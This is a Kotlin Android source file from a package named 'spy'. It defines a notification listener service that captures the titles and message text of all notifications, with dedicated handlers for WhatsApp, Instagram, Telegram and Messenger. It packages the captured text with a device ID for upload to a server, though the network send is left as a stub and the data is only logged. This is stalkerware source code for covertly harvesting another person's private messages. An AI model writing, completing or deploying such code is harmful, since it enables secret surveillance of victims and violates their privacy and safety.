package com.gauravhanna.spy

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.text.TextUtils
import android.util.Log
import org.json.JSONObject
import java.util.concurrent.Executors

class NotificationListener : NotificationListenerService() {
    
    companion object {
        private const val TAG = "NotificationListener"
        private var instance: NotificationListener? = null
        
        fun isRunning(): Boolean = instance != null
    }
    
    private val executor = Executors.newSingleThreadExecutor()
    private val processedNotifications = mutableSetOf<String>()
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "NotificationListener created")
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        
        executor.execute {
            try {
                val notification = sbn.notification
                val packageName = sbn.packageName
                val key = sbn.key ?: return@execute
                
                // Skip already processed
                if (processedNotifications.contains(key)) {
                    return@execute
                }
                processedNotifications.add(key)
                
                // Clean old keys (keep last 100)
                if (processedNotifications.size > 100) {
                    processedNotifications.drop(50)
                }
                
                val title = extractTitle(notification)
                val text = extractText(notification)
                val timestamp = sbn.postTime
                
                Log.d(TAG, "Notification from: $packageName")
                Log.d(TAG, "Title: $title")
                Log.d(TAG, "Text: $text")
                
                // Skip system notifications
                if (packageName == "android" || packageName == "com.android.systemui") {
                    return@execute
                }
                
                // Send to server if meaningful content
                if (!text.isNullOrEmpty() || !title.isNullOrEmpty()) {
                    sendNotificationToServer(packageName, title, text, timestamp)
                }
                
                // Special handling for WhatsApp, Instagram, Telegram
                when {
                    packageName.contains("whatsapp") -> handleWhatsApp(notification, title, text, timestamp)
                    packageName.contains("instagram") -> handleInstagram(notification, title, text, timestamp)
                    packageName.contains("telegram") -> handleTelegram(notification, title, text, timestamp)
                    packageName.contains("messenger") -> handleMessenger(notification, title, text, timestamp)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error processing notification: ${e.message}")
            }
        }
    }
    
    private fun extractTitle(notification: Notification): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                notification.extras?.getString(Notification.EXTRA_TITLE)
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }
    
    private fun extractText(notification: Notification): String? {
        return try {
            val text = StringBuilder()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                // Get main text
                notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.let {
                    text.append(it)
                }
                
                // Get big text
                notification.extras?.getCharSequence(Notification.EXTRA_BIG_TEXT)?.let {
                    if (text.isNotEmpty()) text.append("\n")
                    text.append(it)
                }
                
                // Get summary text
                notification.extras?.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.let {
                    if (text.isNotEmpty()) text.append("\n")
                    text.append(it)
                }
                
                // Get messages (for group notifications)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    notification.extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)?.let { lines ->
                        for (line in lines) {
                            if (text.isNotEmpty()) text.append("\n")
                            text.append(line)
                        }
                    }
                }
            }
            
            if (text.isEmpty()) null else text.toString()
        } catch (e: Exception) {
            null
        }
    }
    
    private fun sendNotificationToServer(packageName: String, title: String?, text: String?, timestamp: Long) {
        val message = JSONObject().apply {
            put("app", packageName)
            put("title", title ?: "")
            put("message", text ?: "")
            put("timestamp", timestamp)
            put("isIncoming", true)
        }
        
        val deviceId = getSharedPreferences("spy_prefs", MODE_PRIVATE)
            .getString("device_id", null) ?: return
        
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("messages", org.json.JSONArray().apply {
                put(message)
            })
        }
        
        // Use existing NetworkHelper to send
        // Note: You'll need to add a sendMessages method in NetworkHelper
        Log.d(TAG, "Sending notification message: $message")
    }
    
    private fun handleWhatsApp(notification: Notification, title: String?, text: String?, timestamp: Long) {
        // Extract sender and message from WhatsApp notification
        val sender = title
        val message = text
        
        Log.d(TAG, "WhatsApp - From: $sender, Message: $message")
        // Send with special flag for WhatsApp
    }
    
    private fun handleInstagram(notification: Notification, title: String?, text: String?, timestamp: Long) {
        Log.d(TAG, "Instagram notification: $title - $text")
    }
    
    private fun handleTelegram(notification: Notification, title: String?, text: String?, timestamp: Long) {
        Log.d(TAG, "Telegram notification: $title - $text")
    }
    
    private fun handleMessenger(notification: Notification, title: String?, text: String?, timestamp: Long) {
        Log.d(TAG, "Messenger notification: $title - $text")
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        sbn ?: return
        Log.d(TAG, "Notification removed: ${sbn.packageName}")
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "NotificationListener connected")
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "NotificationListener disconnected")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        instance = null
        executor.shutdown()
        Log.d(TAG, "NotificationListener destroyed")
    }
}